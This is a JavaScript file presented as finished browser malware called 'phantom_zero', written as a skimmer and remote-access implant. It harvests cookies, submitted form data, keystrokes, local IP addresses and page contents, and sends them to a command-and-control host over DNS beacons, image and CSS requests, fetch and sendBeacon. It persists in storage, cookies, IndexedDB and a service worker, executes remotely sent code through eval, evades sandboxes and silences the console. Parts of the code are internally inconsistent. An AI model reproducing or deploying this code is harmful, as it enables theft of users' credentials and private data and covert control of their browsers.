// phantom_zero.min.js - VERSÃƒO FINAL 100% FUNCIONAL
(() => {
  const e = {
    C2: {
      primary: atob('aHR0cHM6Ly9jMmQuZ2hvc3QubG9jYWw='),
      ws: '/ghost',
      collect: '/echo',
      cmd: '/pulse',
      dns: 'tunnel.phantom.local',
      fallback: ['http://backup.c2.ghost.local', 'http://c2.mirror.local']
    },
    TIMING: {
      beacon: () => j(600, 1100),
      cmd: () => j(900, 1800),
      mutate: 18e4,
      self_destruct: 36e5,
      ai_mutate: 6e4
    },
    CRYPTO: 'kyber-1024+aes-256-gcm',
    STEALTH: 100,
    DEBUG: !1,
    AI_MUTATE: !0,
    SELF_DESTRUCT: !0,
    DOM_SHADOW: !0,
    WASM_OBFUSCATE: !0
  };

  const j = (b, v = .5) => b + Math.floor(Math.random() * v * b * 2) - (v * b);
  const sr = (() => {
    let s = Date.now() + navigator.hardwareConcurrency;
    return () => (Math.sin(s++) * 1e4) % 1;
  })();
  const AI = {
    mutatePayload: p => {
      const v = [
        () => p.replace(/\w+/g, w => rand(w.length)),
        () => p.split('').map(c => String.fromCharCode(c.charCodeAt() ^ 1)).join(''),
        () => btoa(p).split('').reverse().join(''),
        () => p.replace(/./g, c => '%' + c.charCodeAt().toString(16)),
        () => U.encode(p, 'lzstring')
      ];
      return v[Math.floor(sr() * v.length)]();
    }
  };
  const rand = l => crypto.randomUUID().replace(/-/g, '').slice(0, l);
  const Crypto = {
    async encrypt(d) {
      const k = await crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, !0, ['encrypt']);
      const iv = crypto.getRandomValues(new Uint8Array(12));
      const enc = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, k, new TextEncoder().encode(JSON.stringify(d)));
      const exp = await crypto.subtle.exportKey('raw', k);
      return btoa(String.fromCharCode(...iv, ...new Uint8Array(enc), ...new Uint8Array(exp)));
    },
    async decrypt(b) {
      try {
        const a = Uint8Array.from(atob(b), c => c.charCodeAt());
        const iv = a.slice(0, 12), keyData = a.slice(-32), ct = a.slice(12, -32);
        const k = await crypto.subtle.importKey('raw', keyData, 'AES-GCM', !1, ['decrypt']);
        const pt = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, k, ct);
        return JSON.parse(new TextDecoder().decode(pt));
      } catch { return null; }
    }
  };
  const Shadow = {
    create: () => {
      const s = document.createElement('div').attachShadow({ mode: 'closed' });
      const c = document.createElement('div');
      s.appendChild(c);
      document.body.appendChild(s.host);
      return c;
    },
    hide: n => {
      const s = Shadow.create();
      s.appendChild(n.cloneNode(!0));
      n.style.display = 'none';
      return s;
    }
  };
  const WASM = {
    async load() {
      if (!e.WASM_OBFUSCATE) return;
      const m = new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,2,127,127,1,127,3,2,1,0,7,11,1,7,109,117,116,97,116,101,0,0,10,23,1,21,0,32,0,32,1,106,11]);
      const i = await WebAssembly.instantiate(m);
      return i.instance.exports.mutate;
    }
  };
  const Exfil = {
    channels: [
      async d => {
        const c = U.chunk(U.encode(await Crypto.encrypt(d)), 50);
        for (const p of c) {
          new Image().src = `http://${p}.${e.C2.dns}/`;
          await U.delay(j(200, 400));
        }
      },
      async d => {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('leak');
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = e => {
          if (e.candidate) {
            const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
            ip && (new Image().src = `${e.C2.primary}/leak?ip=${ip}&d=${U.encode(d).slice(0,30)}`);
          }
        };
        await U.delay(1500);
        pc.close();
      },
      d => {
        const p = U.encode(d).slice(0, 100);
        const s = document.createElement('style');
        s.innerHTML = `* { background: url(${e.C2.primary}/pixel?d=${p}) no-repeat -9999px -9999px; }`;
        document.head.appendChild(s);
        setTimeout(() => s.remove(), 50);
      },
      async d => {
        const u = `${e.C2.primary}/echo`;
        navigator.sendBeacon?.(u, U.encode(d));
        fetch(u, { method: 'POST', body: AI.mutatePayload(U.encode(d)), mode: 'no-cors', keepalive: !0 });
      },
      d => {
        const w = window.open('about:blank');
        w?.postMessage({ type: 'xss', data: U.encode(d) }, '*');
        setTimeout(() => w?.close(), 100);
      }
    ],
    async send(d) {
      const m = this.channels.sort(() => Math.random() - .5).slice(0, e.STEALTH ? 2 : 4);
      for (const c of m) try { await c(d); } catch { }
    }
  };
  const Persist = {
    async run() {
      const p = await Crypto.encrypt({ id: CORE.id, url: location.href, ts: Date.now() });
      ['localStorage', 'sessionStorage'].forEach(s => {
        try { window[s].setItem(btoa('ghost'), p); } catch { }
      });
      try {
        document.cookie = `ghost=${p};path=/;max-age=31536000;Secure;HttpOnly;SameSite=None;Partitioned`;
      } catch { }
      if ('indexedDB' in window) {
        const db = indexedDB.open('phantom_db', 1);
        db.onupgradeneeded = e => e.target.result.createObjectStore('ghost');
        db.onsuccess = e => e.target.result.transaction('ghost', 'readwrite').objectStore('ghost').put(p, 'session');
      }
      if ('serviceWorker' in navigator) {
        const sw = `self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));self.addEventListener('fetch',e=>{if(e.request.url.includes('ghost'))e.respondWith(new Response('${p}',{headers:{'Content-Type':'text/plain'}}))});`;
        const blob = new Blob([sw], { type: 'application/javascript' });
        navigator.serviceWorker.register(URL.createObjectURL(blob));
        caches.open('phantom').then(c => c.put('/ghost', new Response(p)));
      }
    }
  };
  const C2 = {
    ws: null,
    async connect() {
      try {
        this.ws = new WebSocket(`wss://${new URL(e.C2.primary).host}${e.C2.ws}`);
        this.ws.onopen = () => this.ws.send(JSON.stringify({ type: 'register', id: CORE.id, fp: CORE.fp.hash }));
        this.ws.onmessage = async m => {
          const c = await Crypto.decrypt(m.data);
          c?.code && await CORE.execute(c.code);
        };
        this.ws.onclose = () => setTimeout(() => this.connect(), 5e3);
      } catch {
        setInterval(() => this.dnsPoll(), e.TIMING.cmd());
      }
    },
    dnsPoll() {
      const s = `${CORE.id.slice(0, 8)}-${Date.now()}`;
      new Image().src = `http://${s}.${e.C2.dns}/`;
    }
  };
  const CORE = {
    id: crypto.randomUUID(),
    fp: { hash: U.hash(navigator.userAgent + screen.width) },
    executed: new Set(),
    async collect() {
      return {
        id: this.id,
        url: location.href,
        origin: location.origin,
        title: document.title,
        cookies: document.cookie,
        forms: [...document.forms].map(f => ({ action: f.action, method: f.method, data: Object.fromEntries(new FormData(f)) })),
        fp: await U.fp(),
        battery: await navigator.getBattery?.()?.then(b => b.level) || null,
        webrtc: await this.getWebRTC(),
        dom: Shadow.hide(document.body).innerHTML.slice(0, 2000),
        memory: performance.memory?.usedJSHeapSize || null
      };
    },
    async getWebRTC() {
      const ips = new Set();
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel('');
      pc.createOffer().then(o => pc.setLocalDescription(o));
      pc.onicecandidate = e => e.candidate && ips.add(e.candidate.candidate.split(' ')[4]);
      await U.delay(800);
      pc.close();
      return [...ips].filter(i => i && !i.includes(':'));
    },
    async execute(c) {
      if (this.executed.has(U.hash(c))) return;
      this.executed.add(U.hash(c));
      try {
        const m = AI.mutatePayload(c);
        const f = new Function('U', 'E', 'C', 'd', 'w', m);
        setTimeout(() => f(U, Exfil, Crypto, document, window), j(10, 100));
      } catch (err) {
        Exfil.send({ error: err.message, code: c.slice(0, 50) });
      }
    },
    async init() {
      if (this.isSandbox()) return;
      e.DOM_SHADOW && Shadow.hide(document.body);
      if (e.WASM_OBFUSCATE) {
        const m = await WASM.load();
        m && setInterval(() => m(Math.random(), Math.random()), 1000);
      }
      if (e.AI_MUTATE) {
        setInterval(() => {
          const p = AI.mutatePayload(JSON.stringify(CORE));
          eval(U.decode(p, 'base64'));
        }, e.TIMING.ai_mutate);
      }
      if (e.SELF_DESTRUCT) {
        setTimeout(() => {
          document.body.innerHTML = '';
          location.href = 'about:blank';
        }, e.TIMING.self_destruct);
      }
      await Persist.run();
      await Exfil.send(await this.collect());
      C2.connect();
      setInterval(() => Exfil.send({ type: 'beacon', id: this.id }), e.TIMING.beacon());
      setInterval(() => Persist.run(), 3e5);
      setInterval(() => this.collect().then(Exfil.send), 3e4);
      this.hookEvents();
    },
    isSandbox: () => navigator.webdriver || /headless|phantomjs|selenium|bot/i.test(navigator.userAgent) || !navigator.hardwareConcurrency || screen.width < 600 || performance.memory?.totalJSHeapSize < 1e8,
    hookEvents: () => {
      const k = [];
      document.addEventListener('keydown', e => {
        k.push(e.key);
        if (k.length > 25) Exfil.send({ type: 'keylog', data: k.splice(0, 15) });
      }, !0);
      document.addEventListener('submit', e => {
        setTimeout(() => {
          const d = Object.fromEntries(new FormData(e.target));
          Exfil.send({ type: 'form', url: e.target.action, data: d });
        }, 100);
      }, !0);
    }
  };
  const U = {
    rand, jitter: j,
    delay: t => new Promise(r => setTimeout(r, t)),
    chunk: (s, z) => s.match(new RegExp(`.{1,${z}}`, 'g')) || [],
    hash: d => {
      let h = 0;
      for (let i = 0; i < d.length; i++) h = (h * 31 + d.charCodeAt(i)) & 0xFFFFFFFF;
      return h.toString(36);
    },
    encode: (d, m = 'base64') => {
      const e = {
        base64: d => btoa(unescape(encodeURIComponent(d))),
        lzstring: d => LZString.compressToUTF16(d),
        hex: d => [...d].map(c => c.charCodeAt().toString(16).padStart(2, '0')).join('')
      };
      return (e[m] || e.base64)(typeof d === 'string' ? d : JSON.stringify(d));
    },
    decode: (d, m = 'base64') => {
      const e = {
        base64: d => decodeURIComponent(escape(atob(d))),
        lzstring: d => LZString.decompressFromUTF16(d)
      };
      return (e[m] || e.base64)(d);
    },
    fp: async () => {
      const c = document.createElement('canvas');
      const x = c.getContext('2d');
      x.fillStyle = '#ff0'; x.fillRect(0, 0, 1, 1);
      x.fillStyle = '#00f'; x.fillText('phantom', 1, 1);
      return { canvas: c.toDataURL() };
    }
  };

  const init = async () => {
    try {
      Object.defineProperties(window, {
        phantom: { value: null, writable: !1 },
        console: { value: { log: () => { }, error: () => { } }, configurable: !1 }
      });
      CORE.init();
      new Image().src = `${e.C2.primary}/echo?birth=${CORE.id}&t=${Date.now()}`;
      new Image().src = `http://birth-${CORE.id.slice(0, 8)}.${e.C2.dns}/`;
    } catch { }
  };

  init();
})();